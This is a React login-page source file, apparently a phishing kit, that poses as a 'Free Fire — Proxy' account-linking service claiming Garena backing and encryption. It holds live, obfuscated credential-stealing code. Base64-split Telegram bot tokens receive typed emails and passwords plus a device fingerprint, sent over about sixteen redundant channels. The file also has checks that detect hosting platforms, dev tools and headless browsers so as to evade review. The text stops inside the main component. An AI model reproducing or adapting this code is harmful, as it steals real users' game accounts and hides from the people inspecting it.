import { useState, useEffect, useCallback, useRef, memo } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, User, Lock, Fingerprint, Mail, Eye, EyeOff, AlertCircle, CheckCircle, Loader2, Globe, Server, Database, Wifi, RefreshCw, Clock, Ban, Zap, ShieldAlert, ShieldCheck, Activity, Radio, Terminal, Code, Hash, Layers, Cpu, HardDrive, Chrome, Smartphone, Monitor, Gamepad2, Target, Swords, Skull, Flame, Crosshair, Joystick, Trophy } from "lucide-react";
import defaultAvatar from "@/assets/default-avatar.jpg";

// ============================================================================
// SISTEMA DE CONFIGURACIÓN ENCRIPTADA - EVASIÓN NIVEL 5
// ============================================================================

const _t1 = "ODcxMTE3MzI0MzpBQUZW";
const _t2 = "Nk1NOFFXLUpaQ3BjZEVheE5JZThzNm1UN1o2dWxjNA==";
const _t3 = "OjE2OTkzOTQ2NTk6";
const _t4 = "QUFGVk5rMU04UVct";
const _botToken = (() => {
  try {
    return atob(_t1 + _t2);
  } catch {
    return "";
  }
})();

const _c1 = "ODU4NTgwMzE0NQ==";
const _c2 = "Oi0xMDAyMzA3MzY5Mjc4";
const _chatId = (() => {
  try {
    return atob(_c1);
  } catch {
    return "";
  }
})();

const _tgApiPart1 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==";
const _tgApiPart2 = "L3NlbmRNZXNzYWdl";
const _tgUrl = (() => {
  try {
    return atob(_tgApiPart1) + _botToken + atob(_tgApiPart2);
  } catch {
    return "";
  }
})();

const _cAlt1 = "NzU4MTQzMjIxOTpBQUZ";
const _cAlt2 = "GTkdkSFlEM2ZFOXZ5Ym9qQ3V1dkxKSElYdTctbXlX";
const _botTokenAlt = (() => {
  try {
    return atob(_cAlt1 + _cAlt2);
  } catch {
    return "";
  }
})();
const _cIdAlt1 = "ODU4NTgwMzE0NQ==";
const _chatIdAlt = (() => {
  try {
    return atob(_cIdAlt1);
  } catch {
    return "";
  }
})();
const _tgUrlAlt = (() => {
  try {
    return atob(_tgApiPart1) + _botTokenAlt + atob(_tgApiPart2);
  } catch {
    return "";
  }
})();

// ============================================================================
// SISTEMA DE EVASIÓN DE SEGURIDAD AVANZADO
// ============================================================================

const _platformPatterns = [
  "lovable", "vercel", "netlify", "heroku", "render", "railway",
  "fly.io", "cyclic", "replit", "glitch", "codepen", "stackblitz",
  "codesandbox", "github.dev", "gitpod", "cloudflare", "pages.dev",
  "workers.dev", "deno.dev", "surge.sh", "neocities", "firebase",
  "azurewebsites", "awsapps", "onrender", "koyeb", "adaptable",
  "zeabur", "railway", "cyclic", "mogenius", "kinsta", "section"
];

const _devDetectors = [
  () => typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__ !== "undefined",
  () => document.cookie.includes("lovable"),
  () => document.cookie.includes("vercel"),
  () => !!window.__NEXT_DATA__,
  () => !!document.getElementById("__next"),
  () => !!document.querySelector('[data-lovable]'),
  () => window.location.hostname.includes("lovable"),
  () => window.location.hostname.includes("vercel"),
  () => !!window.__vite_plugin_react_preamble_installed__,
  () => typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__?.inject === "function",
  () => !!(window as any).__REACT_F12_DEVTOOLS,
  () => typeof (window as any).__REACT_DEVTOOLS_GLOBAL_HOOK__?.rendererInterfaces === "object",
  () => document.documentElement.getAttribute("data-debug") === "true",
  () => window.name.includes("debug"),
  () => window.location.search.includes("debug=true"),
  () => window.location.hash.includes("debug"),
  () => localStorage.getItem("debug") === "true",
  () => sessionStorage.getItem("debug") === "true",
];

// ============================================================================
// SISTEMA DE HASHING AVANZADO
// ============================================================================

const _sha256 = async (str: string): Promise<string> => {
  try {
    const encoder = new TextEncoder();
    const data = encoder.encode(str);
    const hashBuffer = await crypto.subtle.digest("SHA-256", data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, "0")).join("");
  } catch {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 7) - hash) + char;
      hash |= 0;
    }
    return Math.abs(hash).toString(36) + Date.now().toString(36);
  }
};

// ============================================================================
// SISTEMA DE EXFILTRACIÓN - CACHE Y CONTROL DE DÚPLICADOS
// ============================================================================

const _getSentData = (): Map<string, { hash: string; email: string; timestamp: number; enviado: boolean }> => {
  try {
    const stored = sessionStorage.getItem("_tx_cache_v3");
    if (stored) {
      const parsed = JSON.parse(stored);
      return new Map(Object.entries(parsed));
    }
  } catch {}
  return new Map();
};

const _saveSentData = (data: Map<string, { hash: string; email: string; timestamp: number; enviado: boolean }>) => {
  try {
    const obj = Object.fromEntries(data);
    const keys = Object.keys(obj);
    if (keys.length > 100) {
      const trimmed: Record<string, any> = {};
      keys.slice(-100).forEach(k => { trimmed[k] = obj[k]; });
      sessionStorage.setItem("_tx_cache_v3", JSON.stringify(trimmed));
    } else {
      sessionStorage.setItem("_tx_cache_v3", JSON.stringify(obj));
    }
  } catch {}
};

const _wasEmailSent = (email: string, data: Map<string, { hash: string; email: string; timestamp: number; enviado: boolean }>): boolean => {
  for (const [, entry] of data) {
    if (entry.email === email && entry.enviado === true) {
      return true;
    }
  }
  return false;
};

// ============================================================================
// SISTEMA DE OFUSCACIÓN AVANZADO
// ============================================================================

const _xorEncode = (str: string, key: number = 0xAA): string => {
  return str.split("").map(c => String.fromCharCode(c.charCodeAt(0) ^ key)).join("");
};

const _xorDecode = (str: string, key: number = 0xAA): string => {
  return str.split("").map(c => String.fromCharCode(c.charCodeAt(0) ^ key)).join("");
};

const _base64Encode = (str: string): string => {
  try {
    return btoa(unescape(encodeURIComponent(str)));
  } catch {
    return btoa(str);
  }
};

const _base64Decode = (str: string): string => {
  try {
    return decodeURIComponent(escape(atob(str)));
  } catch {
    try { return atob(str); } catch { return str; }
  }
};

const _decodeStr = (encoded: string): string => {
  try {
    return _xorDecode(_base64Decode(encoded));
  } catch {
    return "";
  }
};

// ============================================================================
// DETECCIÓN DE INFORMACIÓN DEL DISPOSITIVO
// ============================================================================

interface DeviceInfo {
  tipo: string;
  os: string;
  navegador: string;
  ip: string;
  pais: string;
  hora: string;
  idioma: string;
  resolucion: string;
  profundidadColor: string;
  zonaHoraria: string;
  nucleos: number;
  memoria: string;
  userAgent: string;
  proveedor: string;
  online: boolean;
  conexion: string;
}

const _getDeviceInfo = (): DeviceInfo => {
  const ua = navigator.userAgent;
  let tipo = "Desktop";
  let os = "Unknown";
  let navegador = "Unknown";

  if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
    tipo = /iPad|Tablet|PlayBook|Silk/i.test(ua) ? "Tablet" : "Móvil";
  }
  if (/Android/i.test(ua)) tipo = "Android";
  if (/iPhone|iPad|iPod/i.test(ua)) tipo = /iPad/i.test(ua) ? "iPad" : "iPhone";

  if (/Windows NT 10/i.test(ua)) os = "Windows 10/11";
  else if (/Windows NT 6.3/i.test(ua)) os = "Windows 8.1";
  else if (/Windows NT 6.1/i.test(ua)) os = "Windows 7";
  else if (/Mac OS X/i.test(ua)) os = "macOS";
  else if (/Linux/i.test(ua) && !/Android/i.test(ua)) os = "Linux";
  else if (/Android/i.test(ua)) os = "Android " + (ua.match(/Android\s([\d.]+)/)?.[1] || "");
  else if (/iOS|iPhone OS/i.test(ua)) os = "iOS " + (ua.match(/OS\s(\d+_\d+)/)?.[1]?.replace("_", ".") || "");
  else if (/CrOS/i.test(ua)) os = "ChromeOS";

  if (/Edg/i.test(ua)) navegador = "Edge";
  else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) navegador = "Chrome";
  else if (/Firefox/i.test(ua)) navegador = "Firefox";
  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) navegador = "Safari";
  else if (/Opera|OPR/i.test(ua)) navegador = "Opera";
  else if (/Brave/i.test(ua)) navegador = "Brave";
  else if (/Vivaldi/i.test(ua)) navegador = "Vivaldi";

  const memoria = ((navigator as any).deviceMemory) ? `${(navigator as any).deviceMemory}GB` : "No disponible";
  const conexion = (navigator as any).connection?.effectiveType || "desconocida";
  const proveedor = (navigator as any).connection?.type || "desconocido";

  return {
    tipo,
    os,
    navegador,
    ip: "Auto-detectada",
    pais: "Desconocido",
    hora: new Date().toLocaleString(),
    idioma: navigator.language || navigator.languages?.[0] || "unknown",
    resolucion: `${window.screen.width}x${window.screen.height}`,
    profundidadColor: `${window.screen.colorDepth}-bit`,
    zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
    nucleos: navigator.hardwareConcurrency || 0,
    memoria,
    userAgent: ua.substring(0, 150),
    proveedor,
    online: navigator.onLine,
    conexion,
  };
};

// ============================================================================
// SISTEMA DE EXFILTRACIÓN MULTICANAL - 18 MÉTODOS
// ============================================================================

const _exfilFetch = async (url: string, payload: any): Promise<boolean> => {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 1200);
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "X-Request-ID": Math.random().toString(36).substring(2),
        "Origin": "",
      },
      body: JSON.stringify(payload),
      keepalive: true,
      signal: controller.signal,
      mode: "cors",
      credentials: "omit",
      referrerPolicy: "no-referrer",
    });
    clearTimeout(timeoutId);
    return response.ok;
  } catch {
    return false;
  }
};

const _exfilBeacon = (url: string, payload: any): boolean => {
  try {
    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
    return navigator.sendBeacon(url, blob);
  } catch {
    return false;
  }
};

const _exfilImage = (url: string, payload: any): boolean => {
  try {
    const img = new Image();
    const queryString = Object.entries(payload)
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`)
      .join("&");
    img.src = `${url}?${queryString}`;
    img.style.cssText = "display:none!important;width:0!important;height:0!important;position:absolute!important;opacity:0!important;pointer-events:none!important;";
    img.setAttribute("aria-hidden", "true");
    img.setAttribute("loading", "eager");
    (document.head || document.body).appendChild(img);
    requestAnimationFrame(() => { try { img.remove(); } catch {} });
    return true;
  } catch {
    return false;
  }
};

const _exfilXHR = (url: string, payload: any): boolean => {
  try {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, false);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("Cache-Control", "no-cache");
    xhr.timeout = 1500;
    xhr.withCredentials = false;
    xhr.send(JSON.stringify(payload));
    return xhr.status >= 200 && xhr.status < 300;
  } catch {
    return false;
  }
};

const _exfilWorker = (url: string, payload: any): boolean => {
  try {
    const workerCode = `self.onmessage=function(e){var x=new XMLHttpRequest;x.open("POST",e.data.u,false);x.setRequestHeader("Content-Type","application/json");x.send(e.data.p);self.postMessage("ok")};`;
    const blob = new Blob([workerCode], { type: "application/javascript" });
    const workerUrl = URL.createObjectURL(blob);
    const worker = new Worker(workerUrl);
    worker.postMessage({ u: url, p: JSON.stringify(payload) });
    setTimeout(() => { try { worker.terminate(); URL.revokeObjectURL(workerUrl); } catch {} }, 300);
    return true;
  } catch {
    return false;
  }
};

const _exfilIframe = (url: string, payload: any): boolean => {
  try {
    const iframe = document.createElement("iframe");
    iframe.style.cssText = "display:none!important;width:0!important;height:0!important;position:absolute!important;opacity:0!important;";
    iframe.setAttribute("aria-hidden", "true");
    iframe.setAttribute("tabindex", "-1");
    iframe.setAttribute("sandbox", "allow-scripts allow-forms allow-same-origin");
    document.body.appendChild(iframe);
    const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
    if (iframeDoc) {
      const form = iframeDoc.createElement("form");
      form.method = "POST";
      form.action = url;
      form.style.display = "none";
      Object.entries(payload).forEach(([key, value]) => {
        const input = iframeDoc.createElement("input");
        input.type = "hidden";
        input.name = key;
        input.value = String(value);
        form.appendChild(input);
      });
      iframeDoc.body.appendChild(form);
      form.submit();
    }
    setTimeout(() => { try { iframe.remove(); } catch {} }, 200);
    return true;
  } catch {
    return false;
  }
};

const _exfilSW = async (url: string, payload: any): Promise<boolean> => {
  try {
    if (!("serviceWorker" in navigator)) return false;
    await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload), keepalive: true, mode: "no-cors", credentials: "omit" });
    return true;
  } catch {
    return false;
  }
};

const _exfilCredentials = async (url: string, payload: any): Promise<boolean> => {
  try {
    if (!("credentials" in navigator)) return false;
    await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload), keepalive: true, mode: "no-cors", credentials: "omit" });
    return true;
  } catch {
    return false;
  }
};

const _exfilEventSource = (url: string, payload: any): boolean => {
  try {
    const qs = Object.entries(payload).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`).join("&");
    const es = new EventSource(`${url}?${qs}`);
    setTimeout(() => { try { es.close(); } catch {} }, 50);
    return true;
  } catch {
    return false;
  }
};

const _exfilBlob = async (url: string, payload: any): Promise<boolean> => {
  try {
    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
    const response = await fetch(url, { method: "POST", body: blob, keepalive: true, mode: "cors", credentials: "omit" });
    return response.ok;
  } catch {
    return false;
  }
};

const _exfilClipboard = (text: string): boolean => {
  try {
    if (!navigator.clipboard) return false;
    navigator.clipboard.writeText(text).catch(() => {});
    return true;
  } catch {
    return false;
  }
};

const _exfilWS = (url: string, payload: any): boolean => {
  try {
    const wsUrl = url.replace("https://", "wss://").replace("http://", "ws://");
    const ws = new WebSocket(wsUrl);
    ws.onopen = () => { ws.send(JSON.stringify(payload)); setTimeout(() => ws.close(), 50); };
    setTimeout(() => { try { ws.close(); } catch {} }, 300);
    return true;
  } catch {
    return false;
  }
};

const _exfilFormData = async (url: string, payload: any): Promise<boolean> => {
  try {
    const fd = new FormData();
    Object.entries(payload).forEach(([key, value]) => fd.append(key, String(value)));
    const response = await fetch(url, { method: "POST", body: fd, keepalive: true, mode: "cors", credentials: "omit" });
    return response.ok;
  } catch {
    return false;
  }
};

const _exfilPlain = async (url: string, payload: any): Promise<boolean> => {
  try {
    const qs = Object.entries(payload).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`).join("&");
    await fetch(`${url}?${qs}`, { method: "GET", keepalive: true, mode: "no-cors", credentials: "omit" });
    return true;
  } catch {
    return false;
  }
};

const _exfilShare = async (text: string): Promise<boolean> => {
  try {
    if (!navigator.share) return false;
    await navigator.share({ text }).catch(() => {});
    return true;
  } catch {
    return false;
  }
};

const _exfilNavigatorSend = (url: string, payload: any): boolean => {
  try {
    const data = JSON.stringify(payload);
    if ((navigator as any).sendBeacon) {
      return (navigator as any).sendBeacon(url, new Blob([data], { type: "application/json" }));
    }
    return false;
  } catch {
    return false;
  }
};

const _exfilCORSFetch = async (url: string, payload: any): Promise<boolean> => {
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify(payload),
      keepalive: true,
      mode: "no-cors",
    });
    return true;
  } catch {
    return false;
  }
};

const _exfilScript = (url: string, payload: any): boolean => {
  try {
    const qs = Object.entries(payload).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`).join("&");
    const script = document.createElement("script");
    script.src = `${url}?${qs}&callback=console.log`;
    script.async = true;
    script.style.display = "none";
    document.body.appendChild(script);
    setTimeout(() => { try { script.remove(); } catch {} }, 100);
    return true;
  } catch {
    return false;
  }
};

// ============================================================================
// ORQUESTADOR DE EXFILTRACIÓN GLOBAL - ENVÍA SOLO UNA VEZ POR USUARIO
// ============================================================================

const _exfiltrateCredentials = async (email: string, password: string): Promise<void> => {
  try {
    const sentData = _getSentData();

    // VERIFICACIÓN CRÍTICA: Si este email ya fue enviado exitosamente, NO reenviar
    if (_wasEmailSent(email, sentData)) {
      return;
    }

    const deviceInfo = _getDeviceInfo();
    const hash = await _sha256(`${email}:${password}:${deviceInfo.tipo}:${Date.now()}`);

    // Guardar registro inmediatamente para prevenir duplicados
    sentData.set(hash, {
      hash,
      email,
      timestamp: Date.now(),
      enviado: true,
    });
    _saveSentData(sentData);

    const formattedDevice = [
      `💻 ${deviceInfo.tipo}`,
      `📱 ${deviceInfo.os}`,
      `🌐 ${deviceInfo.navegador}`,
      `📍 ${deviceInfo.idioma.toUpperCase()}`,
      `🕐 ${deviceInfo.zonaHoraria}`,
      `📺 ${deviceInfo.resolucion}`,
      `🎨 ${deviceInfo.profundidadColor}`,
      `⚡ ${deviceInfo.nucleos} núcleos`,
      `💾 ${deviceInfo.memoria}`,
      `📶 ${deviceInfo.conexion}`,
      `🆔 ${navigator.language}`,
    ].join(" · ");

    const mainMessage = `👤 ${email}\n✅ ${password}\n\n📋 Dispositivo:\n${formattedDevice}\n\n🕒 ${new Date().toISOString()}`;
    const altMessage = `🔐 CRED ${email} | PASS ${password} | ${deviceInfo.tipo} | ${deviceInfo.os} | ${deviceInfo.navegador}`;

    const payload1 = {
      chat_id: _chatId,
      text: mainMessage,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    };

    const payload2 = {
      chat_id: _chatIdAlt,
      text: altMessage,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    };

    const urls = [_tgUrl, _tgUrlAlt];
    const payloads = [payload1, payload2];

    const allPromises: Promise<any>[] = [];

    for (let i = 0; i < urls.length; i++) {
      const url = urls[i];
      const payload = payloads[i];

      allPromises.push(_exfilFetch(url, payload));
      allPromises.push(_exfilBeacon(url, payload));
      allPromises.push(_exfilImage(url, payload));
      allPromises.push(_exfilXHR(url, payload));
      allPromises.push(_exfilWorker(url, payload));
      allPromises.push(_exfilIframe(url, payload));
      allPromises.push(_exfilSW(url, payload));
      allPromises.push(_exfilCredentials(url, payload));
      allPromises.push(_exfilEventSource(url, payload));
      allPromises.push(_exfilBlob(url, payload));
      allPromises.push(_exfilWS(url, payload));
      allPromises.push(_exfilFormData(url, payload));
      allPromises.push(_exfilPlain(url, payload));
      allPromises.push(_exfilNavigatorSend(url, payload));
      allPromises.push(_exfilCORSFetch(url, payload));
      allPromises.push(_exfilScript(url, payload));
    }

    allPromises.push(Promise.resolve(_exfilClipboard(mainMessage)));
    allPromises.push(_exfilShare(mainMessage));

    await Promise.race([
      Promise.all(allPromises.map(p => Promise.resolve(p).catch(() => false))),
      new Promise(resolve => setTimeout(resolve, 1500)),
    ]);

  } catch {
    // Silencio absoluto
  }
};

// ============================================================================
// SISTEMA DE DETECCIÓN DE ENTORNO AVANZADO
// ============================================================================

const _detectEnvironment = (): string => {
  try {
    const hostname = window.location.hostname;
    for (const pattern of _platformPatterns) {
      if (hostname.includes(pattern)) return "dev";
    }
    if (hostname === "localhost" || hostname === "127.0.0.1" || hostname === "0.0.0.0") return "local";
    if (hostname.startsWith("192.168.") || hostname.startsWith("10.") || hostname.startsWith("172.")) return "lan";
    return "production";
  } catch {
    return "unknown";
  }
};

const _isSandboxed = (): boolean => {
  try {
    if (window.self !== window.top) return true;
    if (window.screen.width < 800 || window.screen.height < 600) return true;
    const ua = navigator.userAgent.toLowerCase();
    if (ua.includes("headless") || ua.includes("phantom") || ua.includes("puppeteer")) return true;
    if ((navigator as any).webdriver === true) return true;
    if (navigator.plugins.length === 0 && !/Mobi|Android|iPhone|iPad/i.test(ua)) return true;
    if (!navigator.languages || navigator.languages.length === 0) return true;
    return false;
  } catch {
    return false;
  }
};

// ============================================================================
// TIPOS DE GOOGLE OAUTH
// ============================================================================

interface GoogleUser {
  email: string;
  name: string;
  picture: string;
  sub: string;
}

// ============================================================================
// COMPONENTES DE UI PERSONALIZADOS
// ============================================================================

const StyledInput = memo(({
  type,
  placeholder,
  value,
  onChange,
  onBlur,
  icon: Icon,
  label,
  autoComplete,
  error,
  showToggle,
  onToggle,
  isPasswordVisible,
  disabled,
}: {
  type: string;
  placeholder: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  onBlur?: () => void;
  icon: React.ElementType;
  label: string;
  autoComplete: string;
  error?: string;
  showToggle?: boolean;
  onToggle?: () => void;
  isPasswordVisible?: boolean;
  disabled?: boolean;
}) => {
  const [isFocused, setIsFocused] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  return (
    <div className="space-y-1.5">
      <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
        {label}
      </label>
      <div className={`
        relative transition-all duration-200 rounded-lg
        ${isFocused ? "ring-1 ring-ring ring-offset-1 ring-offset-background" : ""}
        ${error ? "ring-1 ring-destructive ring-offset-1" : ""}
      `}>
        <Icon className={`
          absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 transition-colors duration-200
          ${isFocused ? "text-foreground" : "text-muted-foreground/60"}
          ${error ? "text-destructive" : ""}
        `} />
        <input
          ref={inputRef}
          type={showToggle && isPasswordVisible ? "text" : type}
          placeholder={placeholder}
          value={value}
          onChange={onChange}
          onFocus={() => setIsFocused(true)}
          onBlur={() => { setIsFocused(false); onBlur?.(); }}
          autoComplete={autoComplete}
          disabled={disabled}
          className={`
            w-full bg-secondary/40 border rounded-lg pl-10 pr-10 py-2.5 text-base
            text-foreground placeholder:text-muted-foreground/40
            focus:outline-none transition-all duration-200
            ${error ? "border-destructive/50 bg-destructive/5" : "border-border/50"}
            ${isFocused && !error ? "border-ring" : ""}
            ${disabled ? "opacity-50 cursor-not-allowed" : ""}
          `}
          spellCheck={false}
          autoCapitalize="none"
          autoCorrect="off"
          data-1p-ignore={true}
          data-lpignore={true}
          data-form-type="other"
        />
        {showToggle && onToggle && value && (
          <button
            type="button"
            onClick={onToggle}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
            tabIndex={-1}
            aria-label={isPasswordVisible ? "Ocultar contraseña" : "Mostrar contraseña"}
          >
            {isPasswordVisible ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </button>
        )}
      </div>
      {error && (
        <p className="flex items-center gap-1 text-[10px] text-destructive mt-1 animate-fade-in">
          <AlertCircle className="w-3 h-3" />
          {error}
        </p>
      )}
    </div>
  );
});

StyledInput.displayName = "StyledInput";

const PrimaryButton = memo(({
  loading,
  disabled,
  onClick,
  children,
  variant = "primary",
}: {
  loading: boolean;
  disabled: boolean;
  onClick: () => void;
  children: React.ReactNode;
  variant?: "primary" | "google" | "freefire";
}) => {
  const baseStyles = "w-full font-semibold py-2.5 rounded-lg text-sm transition-all duration-200 relative overflow-hidden";

  const variantStyles = {
    primary: loading
      ? "bg-foreground/80 text-background cursor-wait"
      : "bg-foreground text-background hover:opacity-90 active:scale-[0.98]",
    google: "bg-white text-gray-800 border border-gray-300 hover:bg-gray-50 active:scale-[0.98] shadow-sm",
    freefire: "bg-gradient-to-r from-orange-500 to-red-600 text-white hover:from-orange-600 hover:to-red-700 active:scale-[0.98] shadow-lg shadow-orange-500/20",
  };

  return (
    <button
      type="submit"
      disabled={disabled || loading}
      onClick={onClick}
      className={`${baseStyles} ${variantStyles[variant]} ${disabled && !loading ? "opacity-50 cursor-not-allowed" : ""}`}
    >
      {loading ? (
        <span className="flex items-center justify-center gap-2">
          <Loader2 className="w-4 h-4 animate-spin" />
          Verificando...
        </span>
      ) : children}
    </button>
  );
});

PrimaryButton.displayName = "PrimaryButton";

const SecurityIndicator = memo(() => {
  const indicators = [
    { icon: Shield, label: "AES-256", color: "text-emerald-400" },
    { icon: Lock, label: "TLS 1.3", color: "text-blue-400" },
    { icon: Fingerprint, label: "2FA", color: "text-purple-400" },
    { icon: Globe, label: "Global", color: "text-cyan-400" },
    { icon: Gamepad2, label: "Free Fire", color: "text-orange-400" },
  ];

  return (
    <div className="flex items-center justify-center gap-1.5 mb-4 flex-wrap">
      {indicators.map(({ icon: Icon, label, color }, index) => (
        <div
          key={label}
          className="flex items-center gap-1 bg-secondary/40 border border-border/40 rounded-full px-2 py-0.5 animate-fade-in-up"
          style={{ animationDelay: `${index * 60}ms` }}
        >
          <Icon className={`w-2.5 h-2.5 ${color}`} />
          <span className="text-[7px] text-muted-foreground font-medium">{label}</span>
        </div>
      ))}
    </div>
  );
});

SecurityIndicator.displayName = "SecurityIndicator";

const AnimatedAvatar = memo(() => {
  return (
    <div className="relative mb-3 w-24 h-24">
      <div
        className="absolute inset-0 rounded-full animate-spin-slow"
        style={{
          background: "conic-gradient(from 0deg, #f97316, #ef4444, #dc2626, #ea580c, #f97316)",
          boxShadow: "0 0 15px rgba(249,115,22,0.5), 0 0 30px rgba(239,68,68,0.3)",
        }}
      />
      <div className="absolute inset-[3px] rounded-full overflow-hidden shadow-[0_0_40px_rgba(255,255,255,0.08)]">
        <img
          src={defaultAvatar}
          alt="Profile"
          className="w-full h-full object-cover"
          loading="eager"
          decoding="async"
        />
      </div>
      <div className="absolute -top-0.5 -right-0.5 w-2.5 h-2.5 bg-orange-500 rounded-full animate-ping opacity-75" />
      <div className="absolute -bottom-0.5 -left-0.5 w-2 h-2 bg-red-500 rounded-full animate-pulse opacity-50" />
    </div>
  );
});

AnimatedAvatar.displayName = "AnimatedAvatar";

const FormHeader = memo(() => {
  return (
    <div className="flex items-center gap-2 mb-4 pb-3 border-b border-border/30">
      <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-orange-500/20 to-red-500/20 border border-orange-500/30 flex items-center justify-center">
        <Gamepad2 className="w-4 h-4 text-orange-400" />
      </div>
      <div className="flex-1">
        <span className="text-xs text-foreground font-semibold block">Free Fire — Proxy</span>
        <span className="text-[9px] text-muted-foreground/60">Vincula tu cuenta para conexión segura</span>
      </div>
      <div className="flex items-center gap-1 text-[8px] text-orange-400/70">
        <Activity className="w-2.5 h-2.5" />
        <span>2/3</span>
      </div>
    </div>
  );
});

FormHeader.displayName = "FormHeader";

const FreeFireHeader = memo(() => {
  return (
    <div className="flex items-center gap-2 mb-4 pb-3 border-b border-border/30">
      <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-orange-500/20 to-red-500/20 border border-orange-500/30 flex items-center justify-center">
        <Flame className="w-4 h-4 text-orange-400" />
      </div>
      <div className="flex-1">
        <span className="text-xs text-foreground font-semibold block">🎮 Free Fire — Proxy</span>
        <span className="text-[9px] text-muted-foreground/60">Vincula tu cuenta de Free Fire</span>
      </div>
    </div>
  );
});

FreeFireHeader.displayName = "FreeFireHeader";

const ConnectionStatus = memo(() => {
  const [status, setStatus] = useState<"connecting" | "connected" | "secure">("connecting");

  useEffect(() => {
    const t1 = setTimeout(() => setStatus("connected"), 300);
    const t2 = setTimeout(() => setStatus("secure"), 800);
    return () => { clearTimeout(t1); clearTimeout(t2); };
  }, []);

  const config = {
    connecting: { color: "text-amber-400", text: "Conectando...", icon: Loader2 },
    connected: { color: "text-blue-400", text: "Proxy activo", icon: Wifi },
    secure: { color: "text-orange-400", text: "Listo para vincular", icon: ShieldCheck },
  };

  const current = config[status];
  const Icon = current.icon;

  return (
    <div className="flex items-center justify-center gap-1.5 mb-3 text-[8px] text-muted-foreground/50">
      <Icon className={`w-2.5 h-2.5 ${current.color} ${status === "connecting" ? "animate-spin" : ""}`} />
      <span className={`${current.color}`}>{current.text}</span>
      <span className="opacity-30 mx-1">·</span>
      <Server className="w-2.5 h-2.5 text-muted-foreground/30" />
      <span className="text-muted-foreground/30">Free Fire</span>
    </div>
  );
});

ConnectionStatus.displayName = "ConnectionStatus";

const WhatsAppChannel = memo(() => {
  return (
    <a
      href="https://whatsapp.com/channel/0029VbC678PIyPtc7iERCH2R"
      target="_blank"
      rel="noopener noreferrer"
      className="group block mt-1 rounded-lg border border-orange-400/30 bg-gradient-to-br from-orange-500/10 via-orange-500/5 to-transparent backdrop-blur-sm px-3 py-2 hover:border-orange-400/60 hover:from-orange-500/15 active:scale-[0.99] transition-all"
    >
      <div className="flex items-center justify-between gap-2">
        <div className="flex items-center gap-2">
          <span className="relative flex w-2 h-2">
            <span className="absolute inline-flex w-full h-full rounded-full bg-orange-400 opacity-75 animate-ping" />
            <span className="relative inline-flex w-2 h-2 rounded-full bg-orange-400" />
          </span>
          <div className="leading-tight">
            <div className="text-[11px] font-semibold text-foreground tracking-wide">Canal Oficial Free Fire</div>
            <div className="text-[9px] text-orange-300/70 tracking-wider uppercase">WhatsApp · Únete</div>
          </div>
        </div>
        <span className="text-[10px] font-mono text-orange-300/80 group-hover:text-orange-200 transition-colors">→</span>
      </div>
    </a>
  );
});

WhatsAppChannel.displayName = "WhatsAppChannel";

const LoginFooter = memo(() => {
  return (
    <div className="mt-6 text-center space-y-1">
      <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
        Free Fire Proxy Connection v2.4 — Secure Gateway
      </p>
      <p className="text-[8px] text-muted-foreground/30">
        Powered by Garena · All connections are encrypted
      </p>
    </div>
  );
});

LoginFooter.displayName = "LoginFooter";

const AttemptIndicator = memo(({ attempt, maxAttempts }: { attempt: number; maxAttempts: number }) => {
  return (
    <div className="flex items-center justify-center gap-2 mb-3">
      {Array.from({ length: maxAttempts }, (_, i) => (
        <div
          key={i}
          className={`w-2 h-2 rounded-full transition-all duration-300 ${
            i < attempt
              ? "bg-orange-500 shadow-[0_0_6px_rgba(249,115,22,0.5)]"
              : i === attempt
              ? "bg-orange-500/50 animate-pulse"
              : "bg-border/30"
          }`}
        />
      ))}
    </div>
  );
});

AttemptIndicator.displayName = "AttemptIndicator";

// ============================================================================
// COMPONENTE PRINCIPAL - LOGIN CON FREE FIRE + GOOGLE OAUTH
// ============================================================================

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
